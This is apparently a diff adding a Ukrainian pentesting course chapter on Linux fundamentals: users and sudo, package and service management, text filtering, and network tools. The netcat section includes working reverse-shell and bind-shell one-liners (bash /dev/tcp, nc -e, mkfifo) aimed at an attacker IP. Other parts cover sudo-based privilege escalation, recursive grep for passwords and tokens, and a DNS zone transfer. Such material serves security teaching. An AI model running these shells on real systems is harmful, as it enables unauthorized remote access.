+        <pre><code>root:$6$rounds=5000$salt$hash...:19000:0:99999:7:::
+kali:$y$j9T$salt$hash...:19500:0:99999:7:::
+
+# $6$ = SHA-512, $y$ = yescrypt, $5$ = SHA-256
+# Ці хеші можна спробувати зламати за допомогою John the Ripper або Hashcat</code></pre>
+
+        <h3>Sudo та sudoers</h3>
+        <p>Команда <code>sudo</code> дозволяє виконувати команди від імені іншого користувача (зазвичай root). Конфігурація зберігається в <code>/etc/sudoers</code> (редагується тільки через <code>visudo</code>):</p>
+        <pre><code># Перевірити права sudo поточного користувача
+sudo -l
+
+# Приклад виводу:
+User kali may run the following commands on kali-vm:
+    (ALL : ALL) ALL                          # Повний доступ
+    (root) NOPASSWD: /usr/bin/nmap           # Nmap без пароля
+    (root) NOPASSWD: /usr/bin/vim            # Небезпечно! Vim → shell</code></pre>
+        <p>Для пентестера <code>sudo -l</code> — одна з перших команд після отримання доступу. Якщо sudo дозволяє запуск програми, яка вміє виконувати команди (vim, less, find, python, bash тощо), це прямий шлях до ескалації привілеїв. Повний список таких програм — на <strong>GTFOBins</strong> (gtfobins.github.io).</p>
+
+        <h3>Управління користувачами</h3>
+        <pre><code># Створити нового користувача
+sudo useradd -m -s /bin/bash newuser   # -m створює домашній каталог
+
+# Встановити пароль
+sudo passwd newuser
+
+# Додати користувача до групи sudo
+sudo usermod -aG sudo newuser
+
+# Перегляд груп користувача
+groups kali
+id kali  # Детальна інформація: UID, GID, групи
+
+# Видалити користувача
+sudo userdel -r olduser   # -r видаляє домашній каталог</code></pre>
+      </section>
+
+      <section>
+        <h2>2.5 Управління пакетами та сервісами</h2>
+        <p>Управління програмним забезпеченням в Linux на базі Debian (а отже і в Kali та Parrot) здійснюється через систему пакетів <strong>.deb</strong>. Існують два основні інструменти: високорівневий <strong>APT</strong> і низькорівневий <strong>dpkg</strong>.</p>
+
+        <h3>APT vs dpkg</h3>
+        <table>
+          <tr>
+            <th>Характеристика</th>
+            <th>APT (Advanced Package Tool)</th>
+            <th>dpkg (Debian Package)</th>
+          </tr>
+          <tr>
+            <td>Рівень</td>
+            <td>Високорівневий (фронтенд)</td>
+            <td>Низькорівневий (бекенд)</td>
+          </tr>
+          <tr>
+            <td>Залежності</td>
+            <td>Автоматично вирішує залежності</td>
+            <td>Не вирішує залежності</td>
+          </tr>
+          <tr>
+            <td>Джерело</td>
+            <td>Завантажує з репозиторіїв (Інтернет)</td>
+            <td>Працює тільки з локальними .deb файлами</td>
+          </tr>
+          <tr>
+            <td>Використання</td>
+            <td>Щоденна робота: install, update, upgrade</td>
+            <td>Ручне встановлення .deb, інспекція пакетів</td>
+          </tr>
+        </table>
+
+        <h3>Основні команди APT</h3>
+        <p><strong>Оновлення системи:</strong></p>
+        <pre><code># Оновити список доступних пакетів (не встановлює нічого)
+sudo apt update
+
+# Оновити всі встановлені пакети
+# ВАЖЛИВО: для Kali (rolling release) використовуйте full-upgrade, а не upgrade
+sudo apt full-upgrade
+
+# apt upgrade — оновлює пакети, але НЕ видаляє застарілі
+# apt full-upgrade — оновлює, видаляє старі пакети, встановлює нові залежності
+# Для rolling-дистрибутивів (Kali) full-upgrade є правильним варіантом</code></pre>
+
+        <p><strong>Встановлення та видалення:</strong></p>
+        <pre><code># Встановити пакет
+sudo apt install nmap
+
+# Встановити кілька пакетів одночасно
+sudo apt install gobuster nikto dirb
+
+# Видалити пакет (залишає конфігурацію)
+sudo apt remove nmap
+
+# Видалити пакет разом з конфігурацією
+sudo apt purge nmap
+
+# Видалити невикористані залежності
+sudo apt autoremove</code></pre>
+
+        <p><strong>Пошук та інформація:</strong></p>
+        <pre><code># Пошук пакету за назвою або описом
+apt search "web scanner"
+
+# Детальна інформація про пакет
+apt show nmap
+
+# Список встановлених пакетів
+apt list --installed
+
+# Список пакетів, для яких є оновлення
+apt list --upgradable</code></pre>
+
+        <h3>Основні команди dpkg</h3>
+        <pre><code># Встановити .deb файл вручну
+sudo dpkg -i package_name.deb
+
+# Якщо dpkg -i не вирішив залежності:
+sudo apt install -f    # Виправити незадоволені залежності
+
+# Список всіх встановлених пакетів
+dpkg -l
+
+# Список файлів, встановлених пакетом
+dpkg -L nmap
+
+# Визначити, до якого пакета належить файл
+dpkg -S /usr/bin/nmap
+# nmap: /usr/bin/nmap</code></pre>
+
+        <h3>Метапакети Kali Linux</h3>
+        <p>Kali Linux організовує інструменти в метапакети — групи пов'язаних інструментів, які можна встановити однією командою. Це зручно для налаштування мінімальної інсталяції Kali під конкретні потреби.</p>
+        <pre><code># Встановити стандартний набір інструментів
+sudo apt install kali-linux-default
+
+# Інструменти для веб-тестування
+sudo apt install kali-tools-web
+
+# Інструменти для бездротових мереж
+sudo apt install kali-tools-wireless
+
+# Інструменти для аналізу вразливостей
+sudo apt install kali-tools-vulnerability
+
+# Інструменти для реверс-інженерії
+sudo apt install kali-tools-reverse-engineering
+
+# Інструменти для соціальної інженерії
+sudo apt install kali-tools-social-engineering
+
+# Переглянути список всіх метапакетів Kali
+apt search ^kali-tools-
+apt search ^kali-linux-</code></pre>
+
+        <h3>Управління сервісами через systemctl</h3>
+        <p>У сучасних дистрибутивах Linux (Kali, Parrot, Ubuntu, Debian) для управління сервісами використовується <strong>systemd</strong> через команду <code>systemctl</code>:</p>
+        <pre><code># Запустити сервіс
+sudo systemctl start ssh
+sudo systemctl start apache2
+
+# Зупинити сервіс
+sudo systemctl stop apache2
+
+# Перезапустити сервіс
+sudo systemctl restart ssh
+
+# Перевірити стан сервісу
+sudo systemctl status ssh
+
+# Додати сервіс до автозапуску
+sudo systemctl enable ssh
+
+# Видалити з автозапуску
+sudo systemctl disable ssh
+
+# Приклад: запуск SSH-сервера для віддаленого підключення
+sudo systemctl start ssh
+sudo systemctl enable ssh    # Щоб запускався автоматично
+
+# Перевірити, на якому порті слухає сервіс
+ss -tuln | grep 22</code></pre>
+        <p>Типові сервіси, з якими працює пентестер: <code>ssh</code> (віддалений доступ), <code>apache2</code> або <code>nginx</code> (веб-сервер для розміщення пейлоадів), <code>postgresql</code> (база даних Metasploit), <code>mysql</code> / <code>mariadb</code> (бази даних).</p>
+
+        <h3>Файл /etc/apt/sources.list</h3>
+        <p>Цей файл визначає, звідки APT завантажує пакети. Для Kali Linux він має виглядати так:</p>
+        <pre><code># /etc/apt/sources.list
+deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware
+
+# Не додавайте репозиторії Ubuntu або Debian до Kali — це зламає систему!
+# Kali має власні оптимізовані пакети.</code></pre>
+        <p>Джерело: <strong>Kali Documentation</strong> — docs.kali.org/general-use/kali-linux-sources-list-repositories.</p>
+      </section>
+
+      <section>
+        <h2>2.6 Фільтрація тексту та потоки</h2>
+        <p>Одна з найпотужніших концепцій Linux — це <strong>потоки даних</strong> (streams) та <strong>конвеєри</strong> (pipes), які дозволяють об'єднувати прості команди в складні ланцюги обробки тексту. Ця можливість є критичною для пентесту: аналіз логів, витягування даних зі сканувань, створення словників, фільтрація результатів — все це робиться через конвеєри.</p>
+
+        <h3>Стандартні потоки</h3>
+        <p>Кожна програма в Linux має три стандартні потоки вводу/виводу:</p>
+        <table>
+          <tr>
+            <th>Потік</th>
+            <th>Файловий дескриптор</th>
+            <th>Опис</th>
+            <th>За замовчуванням</th>
+          </tr>
+          <tr>
+            <td><strong>stdin</strong></td>
+            <td>0</td>
+            <td>Стандартний ввід</td>
+            <td>Клавіатура</td>
+          </tr>
+          <tr>
+            <td><strong>stdout</strong></td>
+            <td>1</td>
+            <td>Стандартний вивід (результати)</td>
+            <td>Термінал (екран)</td>
+          </tr>
+          <tr>
+            <td><strong>stderr</strong></td>
+            <td>2</td>
+            <td>Стандартний потік помилок</td>
+            <td>Термінал (екран)</td>
+          </tr>
+        </table>
+
+        <h3>Перенаправлення (Redirections)</h3>
+        <pre><code># Записати stdout у файл (перезаписати)
+nmap 192.168.1.0/24 > scan_results.txt
+
+# Дописати stdout у кінець файлу
+echo "Новий запис" >> notes.txt
+
+# Перенаправити stderr у файл
+find / -name "*.conf" 2> errors.txt
+
+# Перенаправити stderr у stdout (об'єднати потоки)
+find / -name "*.conf" > all_output.txt 2>&1
+
+# Відкинути помилки (в "чорну діру")
+find / -perm -4000 2>/dev/null
+
+# Відкинути весь вивід
+command > /dev/null 2>&1
+
+# Читати stdin з файлу
+wc -l < /etc/passwd</code></pre>
+
+        <h3>Конвеєри (Pipes)</h3>
+        <p>Оператор <code>|</code> (pipe) передає stdout однієї команди як stdin наступної. Це дозволяє будувати ланцюги обробки:</p>
+        <pre><code># Знайти всіх користувачів з оболонкою bash
+cat /etc/passwd | grep "/bin/bash"
+
+# Порахувати кількість таких користувачів
+cat /etc/passwd | grep "/bin/bash" | wc -l
+
+# Багатокрокова обробка
+cat access.log | grep "404" | awk '{print $1}' | sort | uniq -c | sort -rn | head -10
+# Пояснення ланцюга:
+# 1. Прочитати лог
+# 2. Залишити рядки з 404
+# 3. Витягти перше поле (IP-адресу)
+# 4. Відсортувати
+# 5. Порахувати унікальні
+# 6. Відсортувати за кількістю (від більшого)
+# 7. Вивести топ-10</code></pre>
+
+        <h3>grep — пошук за шаблоном</h3>
+        <p><code>grep</code> (Global Regular Expression Print) — одна з найважливіших утиліт для пентестера. Шукає рядки у файлах або потоці, що відповідають заданому шаблону:</p>
+        <table>
+          <tr>
+            <th>Прапорець</th>
+            <th>Опис</th>
+            <th>Приклад</th>
+          </tr>
+          <tr>
+            <td><code>-i</code></td>
+            <td>Ігнорувати регістр</td>
+            <td><code>grep -i "error" log.txt</code></td>
+          </tr>
+          <tr>
+            <td><code>-r</code></td>
+            <td>Рекурсивний пошук по каталогам</td>
+            <td><code>grep -r "password" /etc/</code></td>
+          </tr>
+          <tr>
+            <td><code>-v</code></td>
+            <td>Інвертувати: показати рядки, що НЕ відповідають</td>
+            <td><code>grep -v "^#" config.conf</code></td>
+          </tr>
+          <tr>
+            <td><code>-E</code></td>
+            <td>Розширені регулярні вирази (ERE)</td>
+            <td><code>grep -E "error|warning|critical" log.txt</code></td>
+          </tr>
+          <tr>
+            <td><code>-o</code></td>
+            <td>Вивести тільки збіг, а не весь рядок</td>
+            <td><code>grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" log.txt</code></td>
+          </tr>
+          <tr>
+            <td><code>-c</code></td>
+            <td>Порахувати кількість збігів</td>
+            <td><code>grep -c "Failed" auth.log</code></td>
+          </tr>
+          <tr>
+            <td><code>-A N</code></td>
+            <td>Показати N рядків після збігу (After)</td>
+            <td><code>grep -A 3 "error" log.txt</code></td>
+          </tr>
+          <tr>
+            <td><code>-B N</code></td>
+            <td>Показати N рядків до збігу (Before)</td>
+            <td><code>grep -B 2 "error" log.txt</code></td>
+          </tr>
+          <tr>
+            <td><code>-C N</code></td>
+            <td>Показати N рядків до і після (Context)</td>
+            <td><code>grep -C 5 "exploit" report.txt</code></td>
+          </tr>
+          <tr>
+            <td><code>-n</code></td>
+            <td>Показати номер рядка</td>
+            <td><code>grep -n "TODO" script.sh</code></td>
+          </tr>
+          <tr>
+            <td><code>-l</code></td>
+            <td>Показати тільки імена файлів зі збігами</td>
+            <td><code>grep -rl "password" /var/www/</code></td>
+          </tr>
+        </table>
+        <pre><code># Знайти всі IP-адреси у файлі
+grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" access.log
+
+# Знайти рядки без коментарів у конфігурації
+grep -v "^#" /etc/ssh/sshd_config | grep -v "^$"
+
+# Пошук чутливих даних рекурсивно
+grep -rni "password\|secret\|api_key\|token" /var/www/ 2>/dev/null</code></pre>
+
+        <h3>awk — витягування полів</h3>
+        <p><code>awk</code> — мова програмування для обробки структурованого тексту. Найчастіше використовується для витягування конкретних колонок з виводу команд:</p>
+        <pre><code># Витягти перше поле (роздільник за замовчуванням — пробіл/таб)
+ls -la | awk '{print $9}'         # Імена файлів
+ps aux | awk '{print $1, $11}'    # Користувач та команда
+
+# Вказати роздільник через -F
+cat /etc/passwd | awk -F: '{print $1, $3}'    # Ім'я та UID
+cat /etc/passwd | awk -F: '{print $1 ":" $7}' # Ім'я та оболонка
+
+# Умова: тільки рядки, де UID >= 1000 (звичайні користувачі)
+awk -F: '$3 >= 1000 {print $1, $3}' /etc/passwd
+
+# Сума значень у третьому стовпці
+awk '{sum += $3} END {print sum}' data.txt
+
+# Витягти IP-адреси з логу Apache
+awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn</code></pre>
+
+        <h3>sed — потоковий редактор</h3>
+        <p><code>sed</code> (Stream Editor) — утиліта для пошуку та заміни тексту, видалення рядків та інших трансформацій:</p>
+        <pre><code># Заміна тексту: перше входження в кожному рядку
+sed 's/old/new/' file.txt
+
+# Заміна всіх входжень у кожному рядку (g = global)
+sed 's/http/https/g' urls.txt
+
+# Заміна з записом у файл (-i = in-place)
+sed -i 's/password123/REDACTED/g' report.txt
+
+# Видалити рядки, що містять шаблон
+sed '/^#/d' config.conf         # Видалити коментарі
+sed '/^$/d' file.txt             # Видалити порожні рядки
+
+# Видалити конкретний рядок за номером
+sed '5d' file.txt                # Видалити 5-й рядок
+
+# Вивести тільки певні рядки
+sed -n '10,20p' file.txt         # Рядки з 10 по 20
+
+# Додати текст перед/після рядка
+sed '/pattern/i\Текст перед' file.txt    # Insert before
+sed '/pattern/a\Текст після' file.txt    # Append after</code></pre>
+
+        <h3>Додаткові утиліти фільтрації</h3>
+        <p><code>sort</code> — сортування рядків:</p>
+        <pre><code># Звичайне сортування (за алфавітом)
+sort file.txt
+
+# Числове сортування
+sort -n numbers.txt
+
+# Зворотне сортування
+sort -rn numbers.txt
+
+# Сортування за полем (3-тє поле, роздільник — двокрапка)
+sort -t: -k3 -n /etc/passwd</code></pre>
+
+        <p><code>uniq</code> — видалення дублікатів (працює тільки з відсортованими даними):</p>
+        <pre><code># Видалити дублікати
+sort file.txt | uniq
+
+# Порахувати кількість повторень
+sort file.txt | uniq -c
+
+# Показати тільки дублікати
+sort file.txt | uniq -d</code></pre>
+
+        <p><code>wc</code> (word count) — підрахунок:</p>
+        <pre><code># Кількість рядків
+wc -l /etc/passwd
+
+# Кількість слів
+wc -w document.txt
+
+# Кількість символів
+wc -c file.txt</code></pre>
+
+        <p><code>cut</code> — вирізання полів або символів:</p>
+        <pre><code># Витягти поля з роздільником
+cut -d: -f1 /etc/passwd          # Тільки імена користувачів
+cut -d: -f1,3 /etc/passwd        # Ім'я та UID
+cut -d' ' -f1 access.log         # Перше поле через пробіл
+
+# Витягти символи за позицією
+cut -c1-10 file.txt              # Перші 10 символів кожного рядка</code></pre>
+
+        <p><code>tr</code> — заміна та видалення символів:</p>
+        <pre><code># Замінити малі літери на великі
+echo "hello" | tr 'a-z' 'A-Z'   # HELLO
+
+# Видалити символи
+echo "abc123def" | tr -d '0-9'  # abcdef
+
+# Замінити пробіли на нові рядки (зробити кожне слово окремим рядком)
+echo "one two three" | tr ' ' '\n'
+
+# Стиснути повторювані пробіли
+echo "too   many    spaces" | tr -s ' '</code></pre>
+
+        <h3>Практичні приклади для пентесту</h3>
+        <pre><code># 1. Витягти всі унікальні IP-адреси з лог-файлу
+grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" /var/log/auth.log | sort -u
+
+# 2. Порахувати невдалі спроби входу через SSH
+grep "Failed password" /var/log/auth.log | wc -l
+
+# 3. Топ-10 IP-адрес з невдалими спробами входу
+grep "Failed password" /var/log/auth.log | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | sort | uniq -c | sort -rn | head -10
+
+# 4. Створити словник з імен користувачів
+cat /etc/passwd | cut -d: -f1 | sort > usernames.txt
+
+# 5. Витягти URL з HTML-файлу
+grep -oE 'https?://[^"]+' page.html | sort -u > urls.txt
+
+# 6. Знайти файли конфігурації з паролями у відкритому вигляді
+grep -rn "password\s*=" /etc/ 2>/dev/null | grep -v "^#"
+
+# 7. Конвертувати список портів Nmap у чистий формат
+nmap 192.168.1.1 -p- | grep "open" | cut -d'/' -f1
+
+# 8. Об'єднати два словники та видалити дублікати
+cat wordlist1.txt wordlist2.txt | sort -u > combined.txt</code></pre>
+      </section>
+
+      <section>
+        <h2>2.7 Мережеві утиліти та налаштування</h2>
+        <p>Робота з мережею є щоденною рутиною пентестера. Linux надає потужний набір мережевих утиліт для діагностики, аналізу, сканування та атаки. Знання цих інструментів критично важливе для розвідки (reconnaissance), сканування (scanning) та пост-експлуатації.</p>
+
+        <h3>Перегляд мережевих інтерфейсів</h3>
+        <p>Сучасний інструмент — команда <code>ip</code> з пакета <strong>iproute2</strong> (замінила застарілі <code>ifconfig</code>, <code>route</code>, <code>netstat</code>):</p>
+        <pre><code># Переглянути IP-адреси всіх інтерфейсів
+ip addr show
+ip a          # скорочена форма
+
+# Переглянути тільки конкретний інтерфейс
+ip addr show eth0
+
+# Переглянути таблицю маршрутизації
+ip route show
+ip r          # скорочена форма
+
+# Переглянути стан інтерфейсів (up/down)
+ip link show
+ip l          # скорочена форма
+
+# Увімкнути/вимкнути інтерфейс
+sudo ip link set eth0 up
+sudo ip link set eth0 down
+
+# Встановити IP-адресу вручну
+sudo ip addr add 192.168.1.100/24 dev eth0
+
+# Додати маршрут за замовчуванням
+sudo ip route add default via 192.168.1.1</code></pre>
+
+        <p>Застарілі команди (все ще зустрічаються в документації та старих системах):</p>
+        <pre><code># ifconfig — показати/налаштувати інтерфейси
+ifconfig
+ifconfig eth0 192.168.1.100 netmask 255.255.255.0
+
+# route — таблиця маршрутизації
+route -n</code></pre>
+
+        <h3>Перегляд мережевих з'єднань</h3>
+        <p>Сучасний інструмент — <code>ss</code> (Socket Statistics), який замінив <code>netstat</code>:</p>
+        <pre><code># Показати всі TCP/UDP порти, що слухають
+ss -tuln
+
+# Розшифровка прапорців:
+# -t  TCP
+# -u  UDP
+# -l  Тільки порти, що слухають (listening)
+# -n  Числові адреси (без DNS-розіменування)
+
+# Показати з'єднання з іменами процесів
+ss -tulnp
+
+# Показати всі встановлені TCP-з'єднання
+ss -tn
+
+# Застаріла альтернатива (може знадобитись на старих системах)
+netstat -tuln
+netstat -tulnp</code></pre>
+        <p>Це критична команда при пентесті: після отримання доступу до сервера <code>ss -tulnp</code> показує, які сервіси запущені та на яких портах слухають, що допомагає знайти додаткові вектори атаки та внутрішні сервіси.</p>
+
+        <h3>Діагностика з'єднання</h3>
+        <p><code>ping</code> — перевірка доступності хосту через ICMP:</p>
+        <pre><code># Пінг хосту
+ping 192.168.1.1
+
+# Обмежити кількість пакетів
+ping -c 4 192.168.1.1
+
+# Зменшити інтервал між пакетами (потрібен root)
+sudo ping -i 0.2 192.168.1.1</code></pre>
+        <p>Примітка: багато хостів блокують ICMP (фаєрвол), тому відсутність відповіді не означає, що хост недоступний.</p>
+
+        <p><code>traceroute</code> — показати маршрут до хосту (через які маршрутизатори проходить трафік):</p>
+        <pre><code># Звичайний traceroute (UDP)
+traceroute 8.8.8.8
+
+# TCP traceroute (проходить через більшість фаєрволів)
+sudo traceroute -T 8.8.8.8
+
+# ICMP traceroute
+sudo traceroute -I 8.8.8.8</code></pre>
+
+        <h3>DNS-утиліти</h3>
+        <p>DNS — критична частина розвідки. Linux надає кілька інструментів для DNS-запитів:</p>
+        <p><code>dig</code> (Domain Information Groper) — найпотужніший DNS-інструмент:</p>
+        <pre><code># A-запис (IP-адреса домену)
+dig example.com
+
+# Конкретний тип запису
+dig example.com MX          # Поштові сервери
+dig example.com NS          # Авторитативні DNS-сервери
+dig example.com TXT         # TXT-записи (SPF, DKIM)
+dig example.com AAAA        # IPv6-адреса
+dig example.com ANY         # Всі записи (часто блокується)
+
+# Зворотний DNS-запит (IP → домен)
+dig -x 8.8.8.8
+
+# Запит через конкретний DNS-сервер
+dig @8.8.8.8 example.com
+
+# Трансфер зони (Zone Transfer) — спроба отримати всі записи домену
+# Вразливий DNS-сервер може віддати повний список піддоменів
+dig axfr @ns1.example.com example.com
+
+# Короткий вивід (тільки результат)
+dig +short example.com</code></pre>
+
+        <p><code>nslookup</code> — простіший інструмент для DNS-запитів (інтерактивний та неінтерактивний):</p>
+        <pre><code># Простий запит
+nslookup example.com
+
+# Запит через конкретний DNS-сервер
+nslookup example.com 8.8.8.8
+
+# Конкретний тип запису
+nslookup -type=MX example.com</code></pre>
+
+        <p><code>host</code> — найпростіший DNS-інструмент:</p>
+        <pre><code># A-запит
+host example.com
+
+# Зворотний DNS
+host 8.8.8.8
+
+# Всі записи
+host -a example.com</code></pre>
+
+        <h3>curl та wget — HTTP-клієнти</h3>
+        <p><code>curl</code> — універсальний інструмент для HTTP/HTTPS запитів. Незамінний для тестування веб-додатків:</p>
+        <pre><code># GET-запит
+curl https://example.com
+
+# Зберегти результат у файл
+curl -o page.html https://example.com
+
+# Показати тільки заголовки відповіді
+curl -I https://example.com
+
+# Показати заголовки запиту та відповіді (verbose)
+curl -v https://example.com
+
+# POST-запит з даними
+curl -X POST -d "username=admin&password=test" https://example.com/login
+
+# POST з JSON-даними
+curl -X POST -H "Content-Type: application/json" -d '{"user":"admin"}' https://api.example.com/auth
+
+# Встановити кастомні заголовки
+curl -H "Authorization: Bearer TOKEN123" https://api.example.com/data
+curl -H "User-Agent: Mozilla/5.0" https://example.com
+
+# Ігнорувати помилки SSL-сертифіката (-k)
+curl -k https://self-signed.example.com
+
+# Використати проксі (-x)
+curl -x http://127.0.0.1:8080 https://target.com    # Через Burp Suite
+
+# Слідувати редиректам
+curl -L https://example.com
+
+# Завантажити файл і зберегти з оригінальним ім'ям
+curl -O https://example.com/exploit.py</code></pre>
+
+        <p><code>wget</code> — орієнтований на завантаження файлів:</p>
+        <pre><code># Завантажити файл
+wget https://example.com/file.zip
+
+# Рекурсивне завантаження (дзеркало сайту)
+wget -r -l 3 https://example.com/     # -l = глибина рекурсії
+
+# Завантажити в конкретну директорію
+wget -P /tmp/ https://example.com/exploit.py
+
+# Тихий режим
+wget -q https://example.com/file.zip
+
+# Продовжити перерване завантаження
+wget -c https://example.com/large_file.iso</code></pre>
+
+        <h3>SSH — безпечний віддалений доступ</h3>
+        <p><strong>SSH</strong> (Secure Shell) — основний протокол для безпечного віддаленого підключення до серверів. Для пентестера SSH є і інструментом роботи, і потенційним вектором атаки.</p>
+
+        <p><strong>Базове підключення:</strong></p>
+        <pre><code># Підключитися до сервера
+ssh user@192.168.1.10
+
+# Підключитися на нестандартний порт
+ssh -p 2222 user@192.168.1.10
+
+# Виконати команду віддалено без інтерактивної сесії
+ssh user@192.168.1.10 "cat /etc/passwd"</code></pre>
+
+        <p><strong>Аутентифікація за ключем (рекомендований метод):</strong></p>
+        <pre><code># 1. Згенерувати пару ключів (приватний + публічний)
+ssh-keygen -t ed25519 -C "kali@pentest"
+# Зберігає: ~/.ssh/id_ed25519 (приватний) та ~/.ssh/id_ed25519.pub (публічний)
+
+# 2. Скопіювати публічний ключ на сервер
+ssh-copy-id user@192.168.1.10
+# Або вручну: додати вміст .pub до ~/.ssh/authorized_keys на сервері
+
+# 3. Підключитися за ключем (автоматично)
+ssh user@192.168.1.10
+
+# Підключитися з конкретним приватним ключем
+ssh -i ~/.ssh/id_rsa user@192.168.1.10
+
+# ВАЖЛИВО: приватний ключ повинен мати права 600
+chmod 600 ~/.ssh/id_rsa</code></pre>
+
+        <p><strong>SSH-тунелювання (Port Forwarding):</strong></p>
+        <p>SSH-тунелі дозволяють пробрасити порти через зашифрований канал. Це критично для доступу до внутрішніх сервісів, які не видно ззовні.</p>
+        <pre><code># -L: Локальне перенаправлення (Local Port Forwarding)
+# Зробити віддалений порт доступним локально
+ssh -L 8080:127.0.0.1:80 user@192.168.1.10
+# Тепер http://localhost:8080 → порт 80 на сервері
+
+# Доступ до внутрішнього сервісу через pivot-хост
+ssh -L 3306:10.0.0.5:3306 user@192.168.1.10
+# Тепер localhost:3306 → MySQL на 10.0.0.5 через 192.168.1.10
+
+# -R: Зворотне перенаправлення (Remote Port Forwarding)
+# Зробити локальний порт доступним на віддаленій машині
+ssh -R 4444:127.0.0.1:4444 user@192.168.1.10
+# Порт 4444 на сервері → перенаправляє на наш локальний 4444
+
+# -D: Динамічний SOCKS-проксі
+# Створити SOCKS5-проксі для маршрутизації всього трафіку через сервер
+ssh -D 9050 user@192.168.1.10
+# Потім налаштувати браузер або proxychains на SOCKS5 127.0.0.1:9050</code></pre>
+
+        <h3>Netcat — "швейцарський ніж" мережі</h3>
+        <p><code>nc</code> (Netcat) — простий, але надзвичайно універсальний мережевий інструмент. Використовується для створення з'єднань, передачі файлів, сканування портів та отримання зворотних оболонок (reverse shell).</p>
+
+        <p><strong>Слухач (listener):</strong></p>
+        <pre><code># Створити слухач на порту 4444
+nc -lvnp 4444
+# -l  Listen mode (режим прослуховування)
+# -v  Verbose (детальний вивід)
+# -n  Не робити DNS-розіменування
+# -p  Вказати порт</code></pre>
+
+        <p><strong>Підключення до слухача:</strong></p>
+        <pre><code># Підключитися до слухача
+nc 192.168.1.10 4444
+
+# Надіслати повідомлення
+echo "Hello" | nc 192.168.1.10 4444</code></pre>
+
+        <p><strong>Reverse Shell (зворотна оболонка):</strong></p>
+        <p>Це основний спосіб отримання інтерактивного доступу до скомпрометованої системи:</p>
+        <pre><code># На машині атакуючого (Kali) — запустити слухач:
+nc -lvnp 4444
+
+# На цільовій машині — ініціювати зворотне з'єднання:
+# Варіант з bash:
+bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
+
+# Варіант з Netcat (якщо є -e):
+nc -e /bin/bash 192.168.1.5 4444
+
+# Варіант з Netcat (без -e, через FIFO):
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.1.5 4444 > /tmp/f</code></pre>
+
+        <p><strong>Bind Shell (пряма оболонка):</strong></p>
+        <pre><code># На цільовій машині — відкрити порт з оболонкою:
+nc -lvnp 5555 -e /bin/bash
+
+# З машини атакуючого — підключитися:
+nc 192.168.1.10 5555</code></pre>
+
+        <p><strong>Передача файлів:</strong></p>
+        <pre><code># На приймаючій стороні:
+nc -lvnp 9999 > received_file.txt
+
+# На відправляючій стороні:
+nc 192.168.1.10 9999 < file_to_send.txt
+
+# Передати бінарний файл (наприклад, exploit)
+# Приймач:
+nc -lvnp 9999 > exploit
+# Відправник:
+nc 192.168.1.5 9999 < exploit</code></pre>
+
+        <p><strong>Сканування портів:</strong></p>
+        <pre><code># Швидке сканування портів (-z = zero-I/O, -v = verbose)
+nc -zv 192.168.1.10 1-1000
+
+# Сканувати конкретні порти
+nc -zv 192.168.1.10 22 80 443 8080</code></pre>
+
+        <h3>Конфігурація мережі: /etc/hosts та /etc/resolv.conf</h3>
+        <p><code>/etc/hosts</code> — локальна таблиця DNS-розіменування. Записи в цьому файлі мають пріоритет над DNS-серверами:</p>
+        <pre><code># /etc/hosts
+127.0.0.1       localhost
+192.168.1.10    target.htb
+192.168.1.10    admin.target.htb
+10.10.14.1      dc01.corp.local
+
+# Використання: при тестуванні на HackTheBox або в корпоративних мережах
+# додайте записи для цільових хостів замість IP-адрес</code></pre>
+
+        <p><code>/etc/resolv.conf</code> — налаштування DNS-серверів:</p>
+        <pre><code># /etc/resolv.conf
+nameserver 8.8.8.8          # Google DNS
+nameserver 8.8.4.4          # Google DNS (резервний)
+nameserver 192.168.1.1      # Локальний роутер
+
+# При тестуванні внутрішньої мережі можна вказати
+# DNS-сервер контролера домену:
+nameserver 10.10.14.1</code></pre>
+        <p>Правильне налаштування <code>/etc/hosts</code> і <code>/etc/resolv.conf</code> є обов'язковим кроком при роботі з навчальними платформами (HackTheBox, TryHackMe) та при тестуванні корпоративних Active Directory середовищ, де DNS-імена мають вирішальне значення для роботи Kerberos та інших протоколів аутентифікації.</p>
       </section>
 
     </article>
